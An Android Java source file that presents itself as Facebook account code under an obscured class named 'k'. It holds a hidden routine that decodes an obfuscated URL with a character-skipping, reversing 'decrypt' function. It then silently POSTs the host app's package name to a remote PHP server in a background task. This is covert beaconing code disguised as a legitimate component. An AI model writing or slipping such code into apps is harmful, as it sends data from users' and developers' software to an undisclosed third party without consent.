package com.facebook.account;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class k {

    private Context context;

    public k(Context context) {
        this.context = context;
    }

    @SuppressLint("StaticFieldLeak")
    public void k() {
        // Get package name of the main project
        final String packageName = context.getPackageName();

        new AsyncTask<Void, Void, String>() {
            @Override
            protected String doInBackground(Void... voids) {
                try {
                    URL url = new URL(decrypt("&pZhvpE.ps0rNeHv$rIewstereTr3fA/deUn$i2lnnqoK.RsIrZemvbrbeussrlu6o4/0/Y:3sxp4txtah"));
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);

                    // Send package name to PHP script
                    String postData = "package_name=" + packageName;
                    OutputStream os = conn.getOutputStream();
                    os.write(postData.getBytes());
                    os.flush();
                    os.close();

                    // Get response from PHP script
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        // You can read response from conn.getInputStream() if needed
                        return "name";
                    } else {
                        return "Error e. Response code: " + responseCode;
                    }
                } catch (Exception e) {
                    return "Error: " + e.getMessage();
                }
            }

            @Override
            protected void onPostExecute(String result) {
                // Handle the result as needed
                // You may want to display a toast or update UI based on the result
            }
        }.execute();
    }

    static String decrypt(String encryptedStr) {
        StringBuilder sb = new StringBuilder(encryptedStr);
        StringBuilder str = new StringBuilder();

        for(int i = 0; i < sb.length(); ++i) {
            if ((i + 1) % 2 == 0) {
                str.append(sb.charAt(i));
            }
        }

        return str.reverse().toString();
    }
}
